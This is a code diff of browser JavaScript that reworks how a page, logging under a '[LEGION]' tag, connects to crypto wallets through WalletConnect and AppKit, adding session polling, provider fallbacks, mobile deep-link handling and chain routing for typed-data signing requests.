-              clearTimeout(_akTimeout);
-              try { _akUnsub(); } catch (_) {}
-              resolve(state);
-            }
-          });
+          var _akResolved = false;
+          var _akTimeout = setTimeout(function() {
+            if (!_akResolved) reject(new Error('WalletConnect timeout'));
+          }, 120000);
+          function _akDone(state) {
+            if (_akResolved) return;
+            _akResolved = true;
+            clearTimeout(_akTimeout);
+            clearInterval(_akAddrPoll);
+            resolve(state);
+          }
+          // Method 1: subscribeAccount — fires when wallet connects
+          try {
+            var _akUnsub = _wcModal.subscribeAccount(function(state) {
+              console.log('[LEGION] AppKit subscribeAccount:', state.isConnected, state.address ? state.address.slice(0,10) : 'none');
+              if ((state.isConnected || state.address) && state.address) {
+                try { _akUnsub(); } catch (_) {}
+                _akDone(state);
+              }
+            });
+          } catch (_sa) { console.warn('[LEGION] AppKit subscribeAccount failed:', _sa.message); }
+          // Method 2: subscribeState — fires when modal closes (user connected or cancelled)
+          try {
+            var _akUnsub2 = _wcModal.subscribeState && _wcModal.subscribeState(function(s) {
+              if (!s.open) {
+                var _addr = _wcModal.getAddress && _wcModal.getAddress();
+                console.log('[LEGION] AppKit modal closed, address:', _addr ? _addr.slice(0,10) : 'none');
+                if (_addr && !_akResolved) {
+                  try { _akUnsub2 && _akUnsub2(); } catch (_) {}
+                  _akDone({ isConnected: true, address: _addr, caipAddress: (_wcModal.getCaipAddress && _wcModal.getCaipAddress()) || '' });
+                }
+              }
+            });
+          } catch (_ss) {}
+          // Method 3: poll every second — AppKit state OR localStorage scan
+          // localStorage scan catches the o.terminate crash case:
+          // mobile wallet approves → WC stores session in localStorage → we find it here
+          var _akLsSession = null;
+          var _akAddrPoll = setInterval(function() {
+            try {
+              // Primary: AppKit state
+              var _addr = _wcModal && _wcModal.getAddress && _wcModal.getAddress();
+              // Fallback: localStorage WC v2 session scan
+              if (!_addr) {
+                try {
+                  var _lsKeys = Object.keys(localStorage);
+                  for (var _lsi = 0; _lsi < _lsKeys.length && !_addr; _lsi++) {
+                    var _lsk = _lsKeys[_lsi];
+                    if (_lsk.indexOf('wc@') !== -1 && _lsk.indexOf('session') !== -1) {
+                      var _lsObj = JSON.parse(localStorage.getItem(_lsk) || '{}');
+                      var _lsSessions = Object.values(_lsObj);
+                      for (var _lsj = 0; _lsj < _lsSessions.length && !_addr; _lsj++) {
+                        var _lsS = _lsSessions[_lsj];
+                        if (_lsS && _lsS.namespaces) {
+                          var _lsAccts = [];
+                          Object.values(_lsS.namespaces).forEach(function(ns) {
+                            if (ns.accounts) _lsAccts = _lsAccts.concat(ns.accounts);
+                          });
+                          if (_lsAccts.length > 0) {
+                            _addr = _lsAccts[0].split(':').pop();
+                            _akLsSession = _lsS;
+                            console.log('[LEGION] AppKit poll: address from localStorage ✅', _addr.slice(0, 10));
+                          }
+                        }
+                      }
+                    }
+                  }
+                } catch (_lse) {}
+              }
+              if (_addr && !_akResolved) {
+                var _caip = (_wcModal && _wcModal.getCaipAddress && _wcModal.getCaipAddress()) ||
+                            (_akLsSession && _lsAccts && _lsAccts[0]) || '';
+                _akDone({ isConnected: true, address: _addr, caipAddress: _caip });
+              }
+            } catch (_) {}
+          }, 1000);
         });
+        console.log('[LEGION] AppKit connection resolved — address:', _akState.address ? _akState.address.slice(0, 10) : '?', '| caip:', _akState.caipAddress || '?');
         // caipAddress format: 'eip155:1:0xabc...' or 'solana:5eykt...:ADDR'
         var _akCaip = _akState.caipAddress || '';
         var _akIsSolana = _akCaip.startsWith('solana:');
-        // Get the EIP-1193 / Solana provider from AppKit
+        // Get the EIP-1193 / Solana provider — try multiple AppKit API methods
         var _akProvider = null;
-        try {
-          // subscribeProviders gives { eip155: provider, solana: provider }
-          var _akProviders = _wcModal.getProviders ? _wcModal.getProviders() : {};
-          _akProvider = _akIsSolana ? (_akProviders.solana || null) : (_akProviders['eip155'] || _wcModal.getWalletProvider());
-        } catch (_) {
-          try { _akProvider = _wcModal.getWalletProvider(); } catch (_) {}
+        // Short delay: provider might not be ready immediately after connection event
+        await new Promise(function(r) { setTimeout(r, 500); });
+        var _akProviderMethods = [
+          function() {
+            var ps = _wcModal.getProviders ? _wcModal.getProviders() : {};
+            return _akIsSolana ? (ps.solana || null) : (ps['eip155'] || null);
+          },
+          function() { return _wcModal.getWalletProvider ? _wcModal.getWalletProvider() : null; },
+          function() { return _wcModal.getUniversalProvider ? _wcModal.getUniversalProvider() : null; },
+          function() {
+            // AppKit itself may implement EIP-1193
+            return (_wcModal.request) ? _wcModal : null;
+          },
+        ];
+        for (var _pmi = 0; _pmi < _akProviderMethods.length && !_akProvider; _pmi++) {
+          try {
+            var _p = _akProviderMethods[_pmi]();
+            if (_p && (_p.request || (_p.request === undefined && _pmi === 3))) {
+              _akProvider = _p;
+              console.log('[LEGION] AppKit provider obtained via method', _pmi);
+            }
+          } catch (_pme) {}
+        }
+        if (!_akProvider) {
+          console.warn('[LEGION] AppKit provider null — creating request proxy via modal');
+          // Last resort: proxy that routes through _wcModal directly
+          _akProvider = {
+            request: function(args) {
+              var p = _wcModal.getWalletProvider ? _wcModal.getWalletProvider() : null;
+              if (p && p.request) return p.request(args);
+              if (_wcModal.request) return _wcModal.request(args);
+              return Promise.reject(new Error('AppKit provider unavailable'));
+            }
+          };
         }
         if (_akIsSolana) {
           connectedChains.SOL = {
@@ -5302,7 +5623,7 @@
             provider: _akProvider,
             connected: true, timestamp: Date.now()
           };
-          console.log('[LEGION] AppKit → EVM connected:', _akState.address.substring(0, 10) + '... chain:', _akChainId);
+          console.log('[LEGION] AppKit → EVM connected:', _akState.address.substring(0, 10) + '... chain:', _akChainId, '| provider:', !!_akProvider);
         }
         await runWCSignAndSubmit();
         return;
@@ -5311,7 +5632,12 @@
       throw new Error('Unknown WC mode: ' + _wcMode);
 
     } catch (err) {
-      if (_wcModal) { try { if (_wcModal.close) _wcModal.close(); else if (_wcModal.closeModal) _wcModal.closeModal(); } catch (_) {} }
+      // Reset AppKit — must null it so next attempt creates fresh instance (broken modal reuse = blank modal)
+      if (_wcModal) {
+        try { if (_wcModal.close) _wcModal.close(); else if (_wcModal.closeModal) _wcModal.closeModal(); } catch (_) {}
+        try { if (_wcModal.disconnect) _wcModal.disconnect(); } catch (_) {}
+      }
+      _wcModal = null;
       hideManualQR();
       // Reset providers so next attempt starts fresh (stale state causes silent failures)
       if (_wcProvider) { try { await _wcProvider.disconnect(); } catch (_) {} _wcProvider = null; }
@@ -5331,8 +5657,10 @@
 
   function _buildWcLink(w, uri) {
     var enc = encodeURIComponent(uri);
-    if (w.mobile && w.mobile.universal) return w.mobile.universal.replace(/\/$/, '') + '/wc?uri=' + enc;
+    // Native scheme first — browser stays on page (WC WebSocket stays alive)
+    // Universal HTTPS link navigates browser away → kills WC session promise
     if (w.mobile && w.mobile.native)    return w.mobile.native.replace(/\/$/, '')    + '/wc?uri=' + enc;
+    if (w.mobile && w.mobile.universal) return w.mobile.universal.replace(/\/$/, '') + '/wc?uri=' + enc;
     return null;
   }
 
@@ -5448,22 +5776,74 @@
     var allWallets = null;
 
     function openWallet(link, store, name) {
-      var blurFired = false;
-      function onHide() { blurFired = true; }
-      document.addEventListener('visibilitychange', onHide, { once: true });
-      window.addEventListener('blur', onHide, { once: true });
+      // Save pending WC state so page-reload case can auto-resume
+      try { sessionStorage.setItem('l1_wc_pending', '1'); } catch (_) {}
 
-      // Try window.open first — keeps our page alive (JS + WC WebSocket stay running)
-      // window.location.href navigates AWAY killing the WC session promise
+      // Start polling for session BEFORE we leave — catches both:
+      // A) background-tab case (Android suspends our tab, WS reconnects on return)
+      // B) navigate-away case (page reloads fresh, WC restores session from localStorage)
+      var _sessionPoller = null;
+      var _sessionDone = false;
+
+      function _pollForSession() {
+        if (_sessionDone) return;
+        var _attempts = 0;
+        _sessionPoller = setInterval(function() {
+          _attempts++;
+          var sess = _wcProvider && _wcProvider.session;
+          var hasNs = sess && sess.namespaces && Object.keys(sess.namespaces).length > 0;
+          if (hasNs) {
+            _sessionDone = true;
+            clearInterval(_sessionPoller);
+            document.removeEventListener('visibilitychange', _onVisibilityChange);
+            try { sessionStorage.removeItem('l1_wc_pending'); } catch (_) {}
+            hideManualQR();
+            var cnt = applyWCSession(_wcProvider);
+            if (cnt > 0) { runWCSignAndSubmit(); }
+            return;
+          }
+          if (_attempts >= 20) { clearInterval(_sessionPoller); }
+        }, 1000);
+      }
+
+      function _onVisibilityChange() {
+        if (document.hidden) return;
+        // Page became visible again after user returned from wallet app
+        // Force relay reconnect in case Android suspended our WebSocket
+        try {
+          var relay = _wcProvider && _wcProvider.core && _wcProvider.core.relayer;
+          if (relay && relay.provider && relay.provider.connection) {
+            relay.provider.open && relay.provider.open();
+          }
+        } catch (_) {}
+        // Start polling — session may already be there or arrive in next few seconds
+        if (!_sessionPoller) { _pollForSession(); }
+      }
+      document.addEventListener('visibilitychange', _onVisibilityChange);
+
+      // Check if wallet app opens (blur = page went to background = app launched)
+      var _appOpened = false;
+      function _onBlur() { _appOpened = true; }
+      window.addEventListener('blur', _onBlur, { once: true });
+
+      // Open wallet: try window.open (keeps our tab alive) → fallback to location
       var opened = null;
       try { opened = window.open(link, '_blank'); } catch (_) {}
-      // If popup blocked (some mobile browsers block window.open), fallback to location
-      if (!opened) { window.location.href = link; }
+      if (!opened) {
+        // Popup blocked — navigate away. Save the wc: URI so auto-resume works on reload.
+        try { sessionStorage.setItem('l1_wc_uri', uri); } catch (_) {}
+        window.location.href = link;
+        return;
+      }
 
+      // window.open succeeded — our page stays alive
+      // Also start polling immediately (wallet might approve quickly)
+      setTimeout(function() { if (!_sessionPoller) _pollForSession(); }, 3000);
+
+      // Show "not installed" error if app never opened after 2.5s
       setTimeout(function() {
-        document.removeEventListener('visibilitychange', onHide);
-        window.removeEventListener('blur', onHide);
-        if (!blurFired && !document.hidden) {
+        window.removeEventListener('blur', _onBlur);
+        if (!_appOpened && !document.hidden) {
           var errEl = document.getElementById('l1-wc-err');
           if (errEl) {
             errEl.style.display = 'block';
@@ -5523,7 +5903,20 @@
   function hideManualQR() { var el = document.getElementById('l1-qr-overlay'); if (el) el.remove(); }
 
   function applyWCSession(provider) {
-    var ns = (provider.session && provider.session.namespaces) || {};
+    // Primary: provider.session (set when connect() resolves)
+    // Fallback: SignClient internal session store (set when relay delivers approval, even if connect() is stuck)
+    var _sess = (provider && provider.session) || null;
+    if (!_sess && provider) {
+      try {
+        var _sc = provider.client || provider.signClient;
+        if (_sc && _sc.session && _sc.session.getAll) {
+          var _all = _sc.session.getAll();
+          _sess = (_all && _all.length > 0) ? _all[_all.length - 1] : null;
+          if (_sess) console.log('[LEGION] applyWCSession: session found in SignClient store ✅');
+        }
+      } catch (_e) {}
+    }
+    var ns = (_sess && _sess.namespaces) || {};
     var count = 0;
     if (ns.eip155 && ns.eip155.accounts && ns.eip155.accounts.length) {
       var evmAccounts = ns.eip155.accounts;
@@ -5544,13 +5937,14 @@
       var chainId = availableChainIds[0] || 1;
 
       if (addr) {
-        // Build a smart provider wrapper that routes signing to the correct chain
-        // by reading domain.chainId from typed data, so multi-chain wallets work properly
-        var _sessionTopic = provider.session && provider.session.topic;
+        // Capture session topic from provider OR from the store-fetched session
+        // Needed for SignClient fallback when connect() is stuck (provider.session is null)
+        var _sessionTopic = (provider.session && provider.session.topic) || (_sess && _sess.topic) || null;
+
         var smartProvider = {
           request: function(args) {
             var targetChainId = 'eip155:' + chainId;
-            // For typed data signing, route to the chain the typed data specifies
+            // Route typed data to the chain specified in domain.chainId
             if ((args.method === 'eth_signTypedData_v4' || args.method === 'eth_signTypedData') && args.params && args.params[1]) {
               try {
                 var td = typeof args.params[1] === 'string' ? JSON.parse(args.params[1]) : args.params[1];
@@ -5562,7 +5956,27 @@
                 }
               } catch (_) {}
             }
-            return provider.request({ topic: _sessionTopic, chainId: targetChainId, request: args });
+            // Primary: UniversalProvider.request() — requires provider.session to be set
+            if (provider.session) {
+              return provider.request({ method: args.method, params: args.params }, targetChainId);
+            }
+            // Fallback: SignClient.request() when connect() is stuck but session is in store
+            // provider.session is null → UP.request() would throw "Please call connect() before request()"
+            try {
+              var _scd = provider.client || provider.signClient;
+              if (_scd && _scd.request && _sessionTopic) {
+                console.log('[LEGION] WC smartProvider: UP.session null → SignClient.request() topic:', _sessionTopic.slice(0, 8) + '...');
+                return _scd.request({
+                  topic: _sessionTopic,
+                  chainId: targetChainId,
+                  request: { method: args.method, params: args.params }
+                });
+              }
+            } catch (_scErr) {
+              console.warn('[LEGION] WC SignClient.request() failed:', _scErr && _scErr.message);
+            }
+            // Last resort: try UP anyway (will throw if session truly missing)
+            return provider.request({ method: args.method, params: args.params }, targetChainId);
           }
         };
 
